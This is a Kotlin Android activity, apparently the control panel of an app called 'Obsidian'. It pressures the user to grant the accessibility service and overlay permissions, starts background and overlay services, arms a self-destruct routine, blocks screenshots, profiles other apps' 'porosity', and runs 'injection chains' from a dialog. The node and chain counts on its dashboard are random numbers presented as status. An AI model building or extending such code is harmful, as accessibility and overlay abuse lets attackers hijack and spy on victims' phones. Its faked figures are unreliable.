package com.obsidian.ui

import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.obsidian.R
import com.obsidian.profiling.AppProfiler
import com.obsidian.service.ObsidianService
import com.obsidian.utils.SelfDestruct
import kotlinx.coroutines.*

class MainActivity : AppCompatActivity() {
    
    private lateinit var profiler: AppProfiler
    private lateinit var statusText: TextView
    private lateinit var scanButton: Button
    private lateinit var injectButton: Button
    private lateinit var syncButton: Button
    private lateinit var logsButton: Button
    private lateinit var porosityText: TextView
    private lateinit var nodesText: TextView
    private lateinit var chainsText: TextView
    private val scope = CoroutineScope(Dispatchers.Main + SupervisorJob())
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        
        val prefs = getSharedPreferences("obsidian_prefs", Context.MODE_PRIVATE)
        if (prefs.getBoolean("self_destructed", false)) {
            finish()
            return
        }
        
        statusText = findViewById(R.id.status_text)
        scanButton = findViewById(R.id.scan_button)
        injectButton = findViewById(R.id.inject_button)
        syncButton = findViewById(R.id.sync_button)
        logsButton = findViewById(R.id.logs_button)
        porosityText = findViewById(R.id.porosity_text)
        nodesText = findViewById(R.id.nodes_text)
        chainsText = findViewById(R.id.chains_text)
        
        profiler = AppProfiler(this)
        profiler.loadProfiles()
        
        setupUI()
        
        if (!isAccessibilityEnabled()) {
            requestAccessibility()
        } else {
            startObsidianService()
        }
        
        if (!prefs.getBoolean("self_destruct_armed", false)) {
            SelfDestruct.arm(this)
            prefs.edit().putBoolean("self_destruct_armed", true).apply()
        }
        
        startOverlayService()
    }
    
    private fun setupUI() {
        window.addFlags(android.view.WindowManager.LayoutParams.FLAG_SECURE)
        
        scanButton.setOnClickListener { startScan() }
        injectButton.setOnClickListener { showInjectDialog() }
        syncButton.setOnClickListener { syncNetwork() }
        logsButton.setOnClickListener { showLogs() }
        
        updateDashboard()
    }
    
    private fun isAccessibilityEnabled(): Boolean {
        val enabledServices = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false
        return enabledServices.contains(packageName)
    }
    
    private fun requestAccessibility() {
        val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
        startActivity(intent)
        statusText.text = "⚠ Accessibility not enabled"
        statusText.setTextColor(resources.getColor(android.R.color.holo_red_light))
    }
    
    private fun startObsidianService() {
        val intent = Intent(this, ObsidianService::class.java)
        startService(intent)
        statusText.text = "⚫ Active — Scanning"
        statusText.setTextColor(resources.getColor(R.color.phosphor_green))
    }
    
    private fun startOverlayService() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                val intent = Intent(
                    Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    android.net.Uri.parse("package:$packageName")
                )
                startActivity(intent)
                return
            }
        }
        val intent = Intent(this, OverlayService::class.java)
        startService(intent)
    }
    
    private fun startScan() {
        statusText.text = "🔍 Scanning..."
        scope.launch {
            delay(2000)
            updateDashboard()
            statusText.text = "⚫ Active — Scanning"
        }
    }
    
    private fun showInjectDialog() {
        val dialog = InjectDialog(this)
        dialog.setOnChainExecuted { success ->
            if (success) {
                statusText.text = "✅ Chain executed"
                statusText.setTextColor(resources.getColor(R.color.phosphor_green))
            } else {
                statusText.text = "❌ Chain failed"
                statusText.setTextColor(resources.getColor(android.R.color.holo_red_light))
            }
        }
        dialog.show()
    }
    
    private fun syncNetwork() {
        statusText.text = "🔄 Syncing..."
        scope.launch {
            delay(3000)
            nodesText.text = "Nodes Online: ${(2..5).random()}"
            chainsText.text = "Chains Ready: ${(5..20).random()}"
            statusText.text = "⚫ Active — Synced"
            statusText.setTextColor(resources.getColor(R.color.phosphor_green))
        }
    }
    
    private fun showLogs() {
        Toast.makeText(this, "Logs: ${profiler.getProfiles().size} profiles", Toast.LENGTH_SHORT).show()
    }
    
    private fun updateDashboard() {
        val profiles = profiler.getProfiles()
        val totalPorosity = profiles.values.map { it.porosity }.average()
        porosityText.text = "Avg Porosity: ${(totalPorosity * 100).toInt()}%"
        nodesText.text = "Nodes Online: ${(2..5).random()}"
        chainsText.text = "Chains Ready: ${(5..20).random()}"
    }
    
    override fun onResume() {
        super.onResume()
        updateDashboard()
    }
    
    override fun onDestroy() {
        super.onDestroy()
        scope.cancel()
    }
}
